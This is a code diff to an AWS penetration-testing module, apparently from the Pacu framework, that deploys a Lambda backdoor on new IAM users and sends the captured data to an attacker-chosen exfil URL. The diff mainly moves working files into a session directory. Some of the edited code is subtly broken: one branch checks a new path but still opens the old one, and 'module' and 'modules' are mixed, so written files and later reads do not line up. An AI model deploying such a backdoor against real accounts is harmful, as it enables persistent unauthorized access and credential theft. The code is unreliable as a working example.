@@ -9,6 +9,7 @@ import random
 import string
 import os
 
+from pacu.core.lib import session_dir
 
 module_info = {
     'name': 'lambda__backdoor_new_users',
@@ -50,11 +51,11 @@ def main(args, pacu_main):
         created_lambda_functions = []
         created_cwe_rules = []
 
-        if os.path.isfile(Path(__file__).parent/'created-lambda-functions.txt'):
+        if (session_dir()/'modules'/module_info['name']/'created-lambda-functions.txt').is_file():
             with open(Path(__file__).parent/'created-lambda-functions.txt', 'r') as f:
                 created_lambda_functions = f.readlines()
-        if os.path.isfile(Path(__file__).parent/'created-cloudwatch-events-rules.txt'):
-            with open(Path(__file__).parent/'created-cloudwatch-events-rules.txt', 'r') as f:
+        if (session_dir()/'modules'/module_info['name']/'created-cloudwatch-events-rules.txt').is_file():
+            with open(session_dir()/'modules'/module_info['name']/'created-cloudwatch-events-rules.txt', 'r') as f:
                 created_cwe_rules = f.readlines()
 
         if created_lambda_functions:
@@ -77,9 +78,9 @@ def main(args, pacu_main):
                     break
             if delete_function_file:
                 try:
-                    os.remove(Path(__file__).parent/'created-lambda-functions.txt')
+                    os.remove(session_dir()/'modules'/module_info['name']/'created-lambda-functions.txt')
                 except Exception as error:
-                    print(f"  Failed to remove {Path(__file__).parent/'created-lambda-functions.txt'}")
+                    print(f"  Failed to remove {session_dir()/'modules'/module_info['name']/'created-lambda-functions.txt'}")
                     print('    {}: {}'.format(type(error), error))
 
         if created_cwe_rules:
@@ -106,9 +107,9 @@ def main(args, pacu_main):
                     break
             if delete_cwe_file:
                 try:
-                    os.remove(Path(__file__)/'created-cloudwatch-events-rules.txt')
+                    os.remove(session_dir()/'modules'/module_info['name']/'created-cloudwatch-events-rules.txt')
                 except Exception as error:
-                    print(f"  Failed to remove {Path(__file__)/'created-cloudwatch-events-rules.txt'}")
+                    print(f"  Failed to remove {session_dir()/'modules'/module_info['name']/'created-cloudwatch-events-rules.txt'}")
                     print('    {}: {}'.format(type(error), error))
 
         print('Completed cleanup mode.\n')
@@ -141,19 +142,19 @@ def main(args, pacu_main):
 
     code = code.replace('POST_URL', args.exfil_url)
 
-    with open(Path(__file__).parent/'lambda_function.py', 'w+') as f:
+    with open(session_dir()/'module'/module_info['name']/'lambda_function.py', 'w+') as f:
         f.write(code)
 
     # Zip the Lambda function
     try:
         print('  Zipping the Lambda function...\n')
-        subprocess.run(f"cd {Path(__file__).parent} && rm -f lambda_function.zip && zip lambda_function.zip "
+        subprocess.run(f"cd {session_dir()/'module'/module_info['name']} && rm -f lambda_function.zip && zip lambda_function.zip "
                        f"lambda_function.py && cd ../../", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception as error:
         print('Failed to zip the Lambda function locally: {}\n'.format(error))
         return data
 
-    with open(Path(__file__).parent/'lambda_function.zip', 'rb') as f:
+    with open(session_dir()/'module'/module_info['name']/'lambda_function.zip', 'rb') as f:
         zip_file_bytes = f.read()
 
     client = pacu_main.get_boto3_client('lambda', 'us-east-1')
@@ -220,10 +221,10 @@ def main(args, pacu_main):
             print(code)
 
     if created_resources['LambdaFunctions']:
-        with open(Path(__file__).parent/'created-lambda-functions.txt', 'w+') as f:
+        with open(session_dir()/'modules'/module_info['name']/'created-lambda-functions.txt', 'w+') as f:
             f.write('\n'.join(created_resources['LambdaFunctions']))
     if created_resources['CWERules']:
-        with open(Path(__file__)/'created-cloudwatch-events-rules.txt', 'w+') as f:
+        with open(session_dir()/'modules'/module_info['name']/'created-cloudwatch-events-rules.txt', 'w+') as f:
             f.write('\n'.join(created_resources['CWERules']))
 
     print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')
